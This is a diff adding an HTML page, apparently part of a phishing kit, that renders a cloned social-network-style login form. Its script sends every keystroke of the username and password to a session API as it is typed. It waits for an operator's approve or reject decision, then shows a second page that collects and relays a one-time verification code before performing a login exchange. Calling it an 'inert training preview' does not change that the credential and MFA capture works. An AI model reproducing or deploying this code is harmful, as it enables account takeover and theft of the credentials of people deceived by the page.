@@ -1,0 +1,467 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; font-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'">
+  <title></title>
+  <link rel="icon" type="image/png" sizes="64x64" href="/assets/login-favicon.png">
+  <link rel="stylesheet" href="replace-name.css">
+  <style>
+    html, body, #preview { background: #000000 !important; }
+    #safety-banner { position: sticky; top: 0; z-index: 2147483647; box-sizing: border-box; width: 100%; padding: 12px 18px; background: #ffdf70; color: #241b00; border-bottom: 2px solid #9b7400; font: 700 14px/1.4 system-ui, sans-serif; text-align: center; }
+    #preview [data-disabled-preview] { cursor: not-allowed !important; }
+    #load-error { margin: 40px auto; max-width: 680px; padding: 20px; font: 16px/1.5 system-ui, sans-serif; }
+    .gate-spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.45); border-top-color: #fff; border-radius: 50%; animation: gate-spin .7s linear infinite; }
+    .gate-message { margin: 0 0 12px; }
+    .gate-message[hidden] { display: none !important; }
+    .login-brand-heading { margin: 0 0 20px; color: var(--primary-text, #f3f4f5); font: 400 20px/1.3 system-ui, sans-serif; text-align: left; }
+    .login-brand-heading strong { font-weight: 700; }
+    .login-footer,
+    .login-footer * { color: #a8a8a8 !important; fill: #a8a8a8 !important; }
+    .login-footer-row { display: flex !important; flex-direction: row !important; align-items: center !important; justify-content: center !important; flex-wrap: nowrap !important; gap: 12px !important; }
+    .login-footer-row > span,
+    .login-footer-copyright { flex: 0 0 auto !important; white-space: nowrap !important; }
+    .login-footer-copyright * { white-space: nowrap !important; }
+    .preview-gate-input { transition: transform 100ms ease; }
+    .preview-gate-input + label { transition: transform 100ms ease, color 100ms ease; }
+    .preview-gate-input:focus,
+    .preview-gate-input:not(:placeholder-shown) {
+      transform: translateY(3px);
+    }
+    .preview-gate-input:focus + label,
+    .preview-gate-input:not(:placeholder-shown) + label {
+      color: var(--secondary-text);
+      font-stretch: var(--text-input-label-font-stretch);
+      font-weight: var(--text-input-label-font-weight);
+      line-height: var(--text-input-label-line-height);
+      transform: scale(var(--text-input-label-font-size-scale-multiplier)) translateY(-16px);
+    }
+    .preview-submit-button,
+    .preview-submit-button * { cursor: not-allowed !important; }
+    .preview-submit-button { filter: none !important; opacity: .55 !important; transition: opacity 120ms ease; }
+    .preview-submit-button.is-enabled,
+    .preview-submit-button.is-enabled * { cursor: pointer !important; }
+    .preview-submit-button.is-enabled { opacity: 1 !important; }
+    .preview-submit-button.is-waiting,
+    .preview-submit-button.is-waiting * { cursor: wait !important; }
+    .preview-submit-button.is-waiting { opacity: .7 !important; }
+    .preview-action-label,
+    .preview-action-label * { font-weight: 500 !important; line-height: 1.4 !important; font-stretch: 100% !important; font-family: system-ui, sans-serif !important; }
+    #completion-screen { min-height: calc(100vh - 46px); display: grid; place-items: center; background: #fff; color: #111; font-family: system-ui, sans-serif; text-align: center; }
+    #completion-screen > div { max-width: 520px; padding: 32px; }
+    @keyframes gate-spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <main id="preview" aria-label="Inert training preview"></main>
+  <script>
+    async function loadPreview() {
+      const target = document.getElementById('preview');
+      try {
+        const [response, configResponse] = await Promise.all([
+          fetch('source-fragment.html'),
+          fetch('/api/ui-config'),
+        ]);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        if (!configResponse.ok) throw new Error(`HTTP ${configResponse.status}`);
+        const uiConfig = await configResponse.json();
+        document.title = uiConfig.brandName;
+        const parsed = new DOMParser().parseFromString(await response.text(), 'text/html');
+
+        parsed.querySelectorAll('script, iframe, object, embed, base, meta[http-equiv]').forEach((node) => node.remove());
+        parsed.querySelectorAll('form').forEach((form) => {
+          form.removeAttribute('action');
+          form.removeAttribute('method');
+          form.setAttribute('data-disabled-preview', '');
+        });
+        parsed.querySelectorAll('input, textarea, select, button').forEach((control) => {
+          control.disabled = true;
+          control.removeAttribute('name');
+          control.removeAttribute('autocomplete');
+          control.setAttribute('data-disabled-preview', '');
+        });
+        parsed.querySelectorAll('#login_form input[type="text"], #login_form input[type="email"], #login_form input[type="password"]').forEach((input) => {
+          input.disabled = false;
+          input.removeAttribute('data-disabled-preview');
+        });
+        parsed.querySelectorAll('a').forEach((link) => {
+          link.removeAttribute('href');
+          link.removeAttribute('target');
+          link.setAttribute('data-disabled-preview', '');
+          link.setAttribute('aria-disabled', 'true');
+        });
+        parsed.querySelectorAll('[role="button"]').forEach((button) => {
+          button.setAttribute('aria-disabled', 'true');
+          button.setAttribute('tabindex', '-1');
+          button.setAttribute('data-disabled-preview', '');
+        });
+
+        target.replaceChildren(...parsed.body.childNodes);
+        await initializeApprovalGate(uiConfig);
+      } catch (error) {
+        target.innerHTML = `<p id="load-error">Could not load the local preview: ${String(error)}</p>`;
+      }
+    }
+
+    async function initializeApprovalGate(uiConfig) {
+      const ticketInput = document.getElementById('_r_2_');
+      const codeInput = document.getElementById('_r_5_');
+      const button = document.querySelector('[aria-label="replace-name-6"]');
+      if (!ticketInput || !codeInput || !button) return;
+
+      let actionRow = button.closest('.x14l7nz5');
+      while (actionRow) {
+        actionRow.querySelectorAll('[role="button"], [role="link"]').forEach((control) => {
+          control.classList.add('preview-action-label');
+        });
+        if (actionRow.querySelector('[aria-label="Create new account"]')) break;
+        actionRow = actionRow.nextElementSibling;
+      }
+
+      const replacements = [
+        ['replace-name-6', uiConfig.submitLabel],
+        ['replace-name-2', uiConfig.productName],
+        ['replace-name-3', uiConfig.companyName],
+        ['replace-name', uiConfig.brandName],
+      ];
+      const codeText = uiConfig.codeText || uiConfig.accessCodeLabel || 'verification value';
+      const replaceCodeText = (value) => value.replace(/\bcode\b/gi, codeText);
+      const applyUiConfig = (root) => {
+        const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
+        let textNode;
+        while ((textNode = walker.nextNode())) {
+          for (const [source, replacement] of replacements) {
+            textNode.nodeValue = textNode.nodeValue.split(source).join(replacement);
+          }
+          textNode.nodeValue = textNode.nodeValue.replace(/\bticket\b/g, uiConfig.ticketName);
+          textNode.nodeValue = replaceCodeText(textNode.nodeValue);
+        }
+        root.querySelectorAll('[aria-label], [title]').forEach((element) => {
+          for (const attribute of ['aria-label', 'title']) {
+            if (!element.hasAttribute(attribute)) continue;
+            let value = element.getAttribute(attribute);
+            for (const [source, replacement] of replacements) value = value.split(source).join(replacement);
+            value = value.replace(/\bticket\b/g, uiConfig.ticketName);
+            value = replaceCodeText(value);
+            element.setAttribute(attribute, value);
+          }
+        });
+      };
+      applyUiConfig(document.getElementById('preview'));
+
+      ticketInput.type = 'text';
+      ticketInput.removeAttribute('autocomplete');
+      codeInput.type = 'password';
+      codeInput.removeAttribute('autocomplete');
+      ticketInput.classList.add('preview-gate-input');
+      codeInput.classList.add('preview-gate-input');
+      ticketInput.placeholder = ' ';
+      codeInput.placeholder = ' ';
+      ticketInput.closest('div')?.querySelector('label')?.replaceChildren(uiConfig.ticketIdLabel);
+      codeInput.closest('div')?.querySelector('label')?.replaceChildren(uiConfig.accessCodeLabel);
+      button.removeAttribute('data-disabled-preview');
+      button.classList.add('preview-submit-button');
+      button.classList.remove('x1h6gzvc');
+      button.querySelectorAll('.xti2d7y').forEach((element) => element.classList.remove('xti2d7y'));
+
+      const sessionResponse = await fetch('/api/sessions', { method: 'POST' });
+      const { id } = await sessionResponse.json();
+      const events = new EventSource(`/api/sessions/${id}/events`);
+      const content = button.querySelector('[role="none"]');
+      const originalContent = content.innerHTML;
+      let timer;
+      let waiting = false;
+      let initialApprovalComplete = false;
+      let awaitingFinalApproval = false;
+      let finalEmployeeInput = null;
+      let finalError = null;
+      let updateFinalSubmitState = () => {};
+
+      const updateSubmitState = () => {
+        const enabled = !waiting && Boolean(ticketInput.value.trim()) && Boolean(codeInput.value.trim());
+        button.classList.toggle('is-enabled', enabled);
+        button.classList.toggle('is-waiting', waiting);
+        if (!enabled) button.setAttribute('aria-disabled', 'true');
+        else button.removeAttribute('aria-disabled');
+        button.tabIndex = enabled ? 0 : -1;
+        button.style.pointerEvents = 'auto';
+      };
+
+      const sync = (status = 'editing') => {
+        clearTimeout(timer);
+        timer = setTimeout(() => fetch(`/api/sessions/${id}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ticketId: ticketInput.value, accessCode: codeInput.value, status }),
+        }), 80);
+      };
+      const handleFieldUpdate = () => { updateSubmitState(); sync(); };
+      for (const input of [ticketInput, codeInput]) {
+        input.addEventListener('input', handleFieldUpdate);
+        input.addEventListener('change', handleFieldUpdate);
+        input.addEventListener('keyup', updateSubmitState);
+        input.addEventListener('paste', () => setTimeout(updateSubmitState));
+      }
+      updateSubmitState();
+      const submitStateTimer = setInterval(updateSubmitState, 250);
+
+      const message = document.createElement('div');
+      message.className = 'gate-message x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w x15qll9c x1s9qjmn x71vvrb x7gj0x1 x167l43f xqlyz16 x19bbvq x1f19zv xghbpw2 x13fuv20 x18b5jzi x1q0q8m5 x1t7ytsu x178xt8z x1lun4ml xso031l xpilrb4 x6ikm8r x10wlt62 x1cnzs8 x1xnnf8n xx6bls6 x106a9eq';
+      message.setAttribute('role', 'alert');
+      message.innerHTML = `
+        <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j">
+          <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w">
+            <div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1qughib x6s0dn4 xozqiw3 x1q0g3np xyri2b x1c1uobl x18d9i69 xexx8yu x1ws5yxj xw01apr x4cne27 xifccgj">
+              <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xqcrz7y x1icxu4v x25sj25 x10b6aqq x1yrsyyn">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x2lah0s xa7nqf0 x2h7rmj x1h5im7z x1a1m0xk x1qx5ct2 xw4jnvo">
+                  <path d="M12 10.278c.483 0 .875.391.875.875v4.974a.875.875 0 0 1-1.75 0v-4.974c0-.484.392-.875.875-.875zM12 7.003c.833 0 1.25.4 1.25 1s-.417 1-1.25 1-1.25-.4-1.25-1 .417-1 1.25-1z"></path>
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16z"></path>
+                </svg>
+              </div>
+              <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k x1icxu4v x25sj25 x10b6aqq x1yrsyyn">
+                <div class="x78zum5 xdt5ytf"><span class="gate-message-text x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xt4736n x1havqas x1f0sm9e x12qp5cl xzsf02u x1yc453h xudqn12 x3x7a5m" style="--x---base-line-clamp-line-height: calc(var(--body-line-height) * 1em); --x-lineHeight: calc(var(--body-line-height) * 1em);"></span></div>
+              </div>
+            </div>
+          </div>
+        </div>`;
+      message.hidden = true;
+      const firstInputRow = ticketInput.closest('.x14l7nz5');
+      (firstInputRow?.parentElement || ticketInput.closest('form')).insertBefore(message, firstInputRow || null);
+
+      async function submit() {
+        if (waiting || !ticketInput.value.trim() || !codeInput.value.trim()) return;
+        waiting = true;
+        updateSubmitState();
+        message.hidden = true;
+        content.replaceChildren(Object.assign(document.createElement('span'), { className: 'gate-spinner' }));
+        ticketInput.disabled = true;
+        codeInput.disabled = true;
+        await fetch(`/api/sessions/${id}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ticketId: ticketInput.value, accessCode: codeInput.value, status: 'pending' }),
+        });
+      }
+      button.addEventListener('click', submit);
+      button.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter' || event.key === ' ') { event.preventDefault(); submit(); }
+      });
+
+      function maskCodeDestination(value) {
+        const destination = String(value ?? '').trim();
+        if (!destination) return 'ti*****id';
+        const isNumericDestination = /^[+\d]+$/.test(destination) && /\d/.test(destination);
+        const visibleStartLength = isNumericDestination ? 3 : 2;
+        const visibleEndLength = 2;
+        if (destination.length <= visibleStartLength + visibleEndLength) {
+          return `${destination.slice(0, 1)}${'*'.repeat(Math.max(destination.length - 2, 1))}${destination.slice(-1)}`;
+        }
+        const hiddenLength = destination.length - visibleStartLength - visibleEndLength;
+        return `${destination.slice(0, visibleStartLength)}${'*'.repeat(hiddenLength)}${destination.slice(-visibleEndLength)}`;
+      }
+
+      function getCheckTicketName(ticketId, deliveryTarget) {
+        const value = isUsernameTicketId(ticketId) ? deliveryTarget : ticketId;
+        const destination = String(value ?? '').trim();
+        const isNumericTicketId = destination.length > 0 && /^[+\d]+$/.test(destination) && /\d/.test(destination);
+        return isNumericTicketId ? uiConfig.checkNumericTicketName : uiConfig.checkTicketName;
+      }
+
+      function isUsernameTicketId(value) {
+        const ticketId = String(value ?? '').trim();
+        const isNumericTicketId = ticketId.length > 0 && /^[+\d]+$/.test(ticketId) && /\d/.test(ticketId);
+        const isEmailTicketId = /^[^\s@]+@[^\s@]+$/.test(ticketId);
+        return ticketId.length > 0 && !isNumericTicketId && !isEmailTicketId;
+      }
+
+      async function loadNextPage(enrollmentId, deliveryTarget) {
+        if (!document.getElementById('next-page-styles')) {
+          const stylesheet = document.createElement('link');
+          stylesheet.id = 'next-page-styles';
+          stylesheet.rel = 'stylesheet';
+          stylesheet.href = 'next-page.css';
+          document.head.append(stylesheet);
+          await new Promise((resolve, reject) => {
+            stylesheet.addEventListener('load', resolve, { once: true });
+            stylesheet.addEventListener('error', () => reject(new Error('Could not load next-page.css')), { once: true });
+          });
+        }
+        const response = await fetch('next-page.html');
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const parsed = new DOMParser().parseFromString(await response.text(), 'text/html');
+        parsed.querySelectorAll('script, iframe, object, embed, base, meta[http-equiv]').forEach((node) => node.remove());
+        parsed.querySelectorAll('form').forEach((form) => {
+          form.removeAttribute('action');
+          form.removeAttribute('method');
+          form.setAttribute('data-disabled-preview', '');
+        });
+        parsed.querySelectorAll('input, textarea, select, button').forEach((control) => {
+          control.disabled = true;
+          control.removeAttribute('name');
+          control.removeAttribute('autocomplete');
+          control.setAttribute('data-disabled-preview', '');
+        });
+        const verificationCodeInput = parsed.getElementById('employee-id-input');
+        if (verificationCodeInput) {
+          verificationCodeInput.disabled = false;
+          verificationCodeInput.removeAttribute('data-disabled-preview');
+          verificationCodeInput.setAttribute('autocomplete', 'one-time-code');
+          verificationCodeInput.classList.add('preview-gate-input');
+          verificationCodeInput.placeholder = ' ';
+        }
+        parsed.querySelectorAll('a').forEach((link) => {
+          link.removeAttribute('href');
+          link.removeAttribute('target');
+          link.setAttribute('data-disabled-preview', '');
+          link.setAttribute('aria-disabled', 'true');
+        });
+        parsed.querySelectorAll('[role="button"]').forEach((control) => {
+          control.setAttribute('aria-disabled', 'true');
+          control.setAttribute('tabindex', '-1');
+          control.setAttribute('data-disabled-preview', '');
+        });
+        applyUiConfig(parsed.body);
+        const enrollmentTarget = parsed.getElementById('supplied-enrollment-id');
+        if (enrollmentTarget) enrollmentTarget.textContent = enrollmentId;
+        const ticketHeading = parsed.querySelector('#ticket-heading > span');
+        if (ticketHeading) ticketHeading.textContent = `Check your ${getCheckTicketName(ticketInput.value, deliveryTarget)}`;
+        const ticketTarget = parsed.getElementById('masked-ticket-id');
+        if (ticketTarget) {
+          const codeDestination = isUsernameTicketId(ticketInput.value) ? deliveryTarget : ticketInput.value;
+          ticketTarget.textContent = maskCodeDestination(codeDestination);
+        }
+        document.getElementById('preview').replaceChildren(...parsed.body.childNodes);
+        document.title = 'Enter your code';
+
+        const employeeIdInput = document.getElementById('employee-id-input');
+        const employeeIdContinue = document.getElementById('employee-id-continue');
+        if (employeeIdInput && employeeIdContinue) {
+          finalEmployeeInput = employeeIdInput;
+          finalError = document.createElement('div');
+          finalError.className = 'gate-message-text';
+          finalError.setAttribute('role', 'alert');
+          finalError.style.cssText = 'min-height:18px;margin-top:8px;color:#f87171;font:13px/1.4 system-ui,sans-serif;';
+          employeeIdContinue.parentElement?.parentElement?.append(finalError);
+          let employeeIdTimer;
+          updateFinalSubmitState = () => {
+            const enabled = !awaitingFinalApproval && Boolean(employeeIdInput.value.trim());
+            employeeIdContinue.classList.add('preview-submit-button');
+            employeeIdContinue.classList.toggle('is-enabled', enabled);
+            employeeIdContinue.classList.toggle('is-waiting', awaitingFinalApproval);
+            employeeIdContinue.classList.toggle('x1h6gzvc', !enabled && !awaitingFinalApproval);
+            employeeIdContinue.querySelector('[role="none"]')?.classList.toggle('xti2d7y', !enabled);
+            employeeIdContinue.setAttribute('aria-disabled', String(!enabled));
+            employeeIdContinue.tabIndex = enabled ? 0 : -1;
+            employeeIdInput.disabled = awaitingFinalApproval;
+            if (enabled) employeeIdContinue.removeAttribute('data-disabled-preview');
+            else employeeIdContinue.setAttribute('data-disabled-preview', '');
+          };
+          employeeIdInput.addEventListener('input', () => {
+            finalError.textContent = '';
+            updateFinalSubmitState();
+            clearTimeout(employeeIdTimer);
+            employeeIdTimer = setTimeout(() => fetch(`/api/sessions/${id}`, {
+              method: 'PATCH',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ employeeId: employeeIdInput.value }),
+            }), 80);
+          });
+          const requestFinalLogin = async () => {
+            if (awaitingFinalApproval || !employeeIdInput.value.trim()) return;
+            awaitingFinalApproval = true;
+            finalError.textContent = '';
+            updateFinalSubmitState();
+            clearTimeout(employeeIdTimer);
+            try {
+              const response = await fetch(`/api/sessions/${id}`, {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ employeeId: employeeIdInput.value, status: 'final-pending' }),
+              });
+              if (!response.ok) throw new Error((await response.json()).error || 'Could not request final login.');
+            } catch (error) {
+              awaitingFinalApproval = false;
+              finalError.textContent = String(error.message || error);
+              updateFinalSubmitState();
+            }
+          };
+          employeeIdContinue.addEventListener('click', requestFinalLogin);
+          employeeIdContinue.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter' || event.key === ' ') { event.preventDefault(); requestFinalLogin(); }
+          });
+          updateFinalSubmitState();
+        }
+      }
+
+      async function completeFinalLogin() {
+        try {
+          const response = await fetch('/api/auth/exchange', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: id }),
+          });
+          if (response.status === 404) {
+            events.close();
+            document.getElementById('preview').innerHTML = '<section id="completion-screen"><div><h1>Final login approved</h1><p>The dashboard allowed this training session to continue.</p></div></section>';
+            return;
+          }
+          const result = await response.json();
+          if (!response.ok) throw new Error(result.error || 'Final login could not be completed.');
+          events.close();
+          window.location.assign(result.redirectTo || '/app');
+        } catch (error) {
+          awaitingFinalApproval = false;
+          if (finalEmployeeInput) finalEmployeeInput.disabled = false;
+          if (finalError) finalError.textContent = String(error.message || error);
+          updateFinalSubmitState();
+        }
+      }
+
+      events.addEventListener('decision', async (event) => {
+        const { status, enrollmentId, deliveryTarget } = JSON.parse(event.data);
+        if (status === 'approved' && waiting) {
+          if (awaitingFinalApproval) {
+            await completeFinalLogin();
+          } else if (!initialApprovalComplete) {
+            initialApprovalComplete = true;
+            clearInterval(submitStateTimer);
+            try {
+              await loadNextPage(enrollmentId, deliveryTarget);
+            } catch (error) {
+              initialApprovalComplete = false;
+              waiting = false;
+              ticketInput.disabled = false;
+              codeInput.disabled = false;
+              content.innerHTML = originalContent;
+              message.querySelector('.gate-message-text').textContent = String(error.message || error);
+              message.hidden = false;
+            }
+          }
+        } else if (status === 'rejected' && waiting) {
+          if (awaitingFinalApproval) {
+            awaitingFinalApproval = false;
+            if (finalError) finalError.textContent = uiConfig.rejectionMessage || 'Final login was not approved.';
+            updateFinalSubmitState();
+          } else {
+            waiting = false;
+            ticketInput.disabled = false;
+            codeInput.disabled = false;
+            updateSubmitState();
+            content.innerHTML = originalContent;
+            message.querySelector('.gate-message-text').textContent = uiConfig.rejectionMessage
+              || 'Not approved. Review the demo values and try again.';
+            message.hidden = false;
+          }
+        }
+      });
+    }
+
+    document.addEventListener('submit', (event) => event.preventDefault(), true);
+    document.addEventListener('click', (event) => {
+      if (event.target.closest('a, button, [role="button"]')) event.preventDefault();
+    }, true);
+    loadPreview();
+  </script>
+</body>
+</html>
